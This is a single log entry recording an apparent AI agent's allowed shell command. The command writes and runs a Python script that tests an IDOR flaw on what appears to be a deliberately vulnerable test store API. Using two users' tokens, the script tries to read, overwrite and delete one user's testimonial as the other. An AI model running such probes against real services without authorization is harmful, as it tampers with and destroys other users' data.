{"ts": 1790667235.8818798, "decision_id": "66d7ef143844", "tool": "run_shell", "allow": true, "reason": null, "target": "cat > /tmp/test_idor.py << 'PYEOF'\nimport requests\nimport json\n\n# Read tokens from auth.json\nimport json as jsonlib\nwith open('/work/auth.json') as f:\n    auth = jsonlib.load(f)\n\ntoken_a = auth['user_a']['access_token']\ntoken_b = auth['user_b']['access_token']\n\nheaders_a = {\"Authorization\": f\"Bearer {token_a}\", \"Content-Type\": \"application/json\"}\nheaders_b = {\"Authorization\": f\"Bearer {token_b}\", \"Content-Type\": \"application/json\"}\nbase = \"https://duck-store.escape.tech/api/v1\"\n\n# Create testimonial as user_a\nresp = requests.post(f\"{base}/testimonials\", headers=headers_a, json={\"content\": \"Test from user_a\", \"rating\": 5})\nprint(\"CREATE as user_a:\", resp.status_code, resp.text)\n\nif resp.status_code in (200, 201):\n    tid = resp.json().get(\"id\")\n    print(f\"Created testimonial ID: {tid}\")\n    \n    # Try to GET as user_b\n    resp = requests.get(f\"{base}/testimonials/{tid}\", headers=headers_b)\n    print(\"GET as user_b:\", resp.status_code, resp.text)\n    \n    # Try to PUT as user_b\n    resp = requests.put(f\"{base}/testimonials/{tid}\", headers=headers_b, json={\"content\": \"Hacked by user_b\", \"rating\": 1})\n    print(\"PUT as user_b:\", resp.status_code, resp.text)\n    \n    # Try to DELETE as user_b\n    resp = requests.delete(f\"{base}/testimonials/{tid}\", headers=headers_b)\n    print(\"DELETE as user_b:\", resp.status_code, resp.text)\nPYEOF\npython3 /tmp/test_idor.py"}
